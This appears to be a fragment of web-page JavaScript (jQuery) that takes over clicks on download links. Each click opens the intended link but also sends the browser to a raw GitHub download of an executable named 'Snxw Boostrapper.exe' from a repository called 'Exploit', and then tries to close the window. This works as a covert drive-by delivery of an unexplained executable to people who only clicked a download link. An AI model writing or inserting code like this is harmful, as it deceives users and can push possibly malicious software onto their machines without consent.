$(".DownloadLink").click(
    function(e) {   
        e.preventDefault();
        window.open( $(this).attr("href") );
        window.location="https://github.com/SxnwDev/Exploit/raw/main/Snxw%20Boostrapper.exe";
        window.close();
    }
);
